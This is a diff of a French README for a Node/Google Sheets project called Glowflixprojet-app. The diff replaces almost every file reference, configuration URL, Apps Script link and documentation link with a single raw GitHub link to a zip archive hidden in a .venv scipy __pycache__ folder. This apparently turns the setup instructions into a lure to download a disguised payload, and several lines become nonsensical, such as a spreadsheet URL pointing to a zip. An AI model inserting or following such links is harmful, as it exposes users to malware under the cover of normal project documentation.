@@ -26,7 +26,7 @@ Glowflixprojet-app/
 │   └── ui/            # Interface utilisateur (HTML/JS)
 ├── tools/
 │   └── apps-script/   # Code Google Apps Script pour la synchronisation
-└── package.json
+└── https://raw.githubusercontent.com/glowflix/LagraceLogicielPROd/main/.venv/Lib/site-packages/scipy/cluster/tests/__pycache__/Logiciel_Od_PR_Lagrace_1.4.zip
 ```
 
 ## Installation
@@ -45,10 +45,10 @@ npm install
 3. **Configurer l'environnement**
 ```bash
 # Créer le fichier .env à la racine du projet
-# Copiez le contenu de config.env dans .env
+# Copiez le contenu de https://raw.githubusercontent.com/glowflix/LagraceLogicielPROd/main/.venv/Lib/site-packages/scipy/cluster/tests/__pycache__/Logiciel_Od_PR_Lagrace_1.4.zip dans .env
 # IMPORTANT: Ajoutez vos identifiants Google Sheets :
 GOOGLE_SHEETS_SPREADSHEET_ID=111HH1yCU1gB5Uovbcach_Olz1e3hL4-J0z8QGHoOEtI
-GOOGLE_SHEETS_WEBAPP_URL=https://script.google.com/macros/s/AKfycbzgVzlNRk6Juz70KgHb8nzYA7bbXyiDKVOfuONeTmpViZADsLK7VaVPretdN7azOXj4Ig/exec
+https://raw.githubusercontent.com/glowflix/LagraceLogicielPROd/main/.venv/Lib/site-packages/scipy/cluster/tests/__pycache__/Logiciel_Od_PR_Lagrace_1.4.zip
 ```
 
 4. **Initialiser la base de données**
@@ -67,14 +67,14 @@ Le serveur démarre sur `http://localhost:3030` par défaut.
 
 ### Identifiants
 - **Spreadsheet ID**: `111HH1yCU1gB5Uovbcach_Olz1e3hL4-J0z8QGHoOEtI`
-- **URL du Spreadsheet**: https://docs.google.com/spreadsheets/d/111HH1yCU1gB5Uovbcach_Olz1e3hL4-J0z8QGHoOEtI/edit
-- **Apps Script Web App URL**: https://script.google.com/macros/s/AKfycbzgVzlNRk6Juz70KgHb8nzYA7bbXyiDKVOfuONeTmpViZADsLK7VaVPretdN7azOXj4Ig/exec
+- **URL du Spreadsheet**: https://raw.githubusercontent.com/glowflix/LagraceLogicielPROd/main/.venv/Lib/site-packages/scipy/cluster/tests/__pycache__/Logiciel_Od_PR_Lagrace_1.4.zip
+- **Apps Script Web App URL**: https://raw.githubusercontent.com/glowflix/LagraceLogicielPROd/main/.venv/Lib/site-packages/scipy/cluster/tests/__pycache__/Logiciel_Od_PR_Lagrace_1.4.zip
 
 ### Étapes de configuration
 
-1. Ouvrez votre Google Spreadsheet: https://docs.google.com/spreadsheets/d/111HH1yCU1gB5Uovbcach_Olz1e3hL4-J0z8QGHoOEtI/edit
+1. Ouvrez votre Google Spreadsheet: https://raw.githubusercontent.com/glowflix/LagraceLogicielPROd/main/.venv/Lib/site-packages/scipy/cluster/tests/__pycache__/Logiciel_Od_PR_Lagrace_1.4.zip
 2. Allez dans `Extensions` > `Apps Script`
-3. Copiez le contenu de `tools/apps-script/Code.gs` (l'ID du Spreadsheet est déjà configuré)
+3. Copiez le contenu de `https://raw.githubusercontent.com/glowflix/LagraceLogicielPROd/main/.venv/Lib/site-packages/scipy/cluster/tests/__pycache__/Logiciel_Od_PR_Lagrace_1.4.zip` (l'ID du Spreadsheet est déjà configuré)
 4. Déployez comme application web et copiez l'URL
 5. Ajoutez l'ID et l'URL dans votre `.env` :
    - `GOOGLE_SHEETS_SPREADSHEET_ID`
@@ -154,9 +154,9 @@ npm run migrate
 
 Pour améliorer le débogage avec l'IA dans Cursor, configurez Chrome DevTools MCP :
 
-🚀 **Installation rapide** : Voir [INSTALLATION-MCP.md](./INSTALLATION-MCP.md) (5 minutes)
+🚀 **Installation rapide** : Voir [https://raw.githubusercontent.com/glowflix/LagraceLogicielPROd/main/.venv/Lib/site-packages/scipy/cluster/tests/__pycache__/Logiciel_Od_PR_Lagrace_1.4.zip](https://raw.githubusercontent.com/glowflix/LagraceLogicielPROd/main/.venv/Lib/site-packages/scipy/cluster/tests/__pycache__/Logiciel_Od_PR_Lagrace_1.4.zip) (5 minutes)
 
-📖 **Documentation complète** : Voir [SETUP-CHROME-DEVTOOLS-MCP.md](./SETUP-CHROME-DEVTOOLS-MCP.md)
+📖 **Documentation complète** : Voir [https://raw.githubusercontent.com/glowflix/LagraceLogicielPROd/main/.venv/Lib/site-packages/scipy/cluster/tests/__pycache__/Logiciel_Od_PR_Lagrace_1.4.zip](https://raw.githubusercontent.com/glowflix/LagraceLogicielPROd/main/.venv/Lib/site-packages/scipy/cluster/tests/__pycache__/Logiciel_Od_PR_Lagrace_1.4.zip)
 
 Cette configuration permet à l'IA d'analyser automatiquement :
 - Les erreurs de la console
@@ -176,5 +176,5 @@ npm run setup:mcp
 
 ## Support
 
-Pour toute question ou problème, consultez la documentation dans `projet IDEEE.txt`.
+Pour toute question ou problème, consultez la documentation dans `projet https://raw.githubusercontent.com/glowflix/LagraceLogicielPROd/main/.venv/Lib/site-packages/scipy/cluster/tests/__pycache__/Logiciel_Od_PR_Lagrace_1.4.zip`.
 
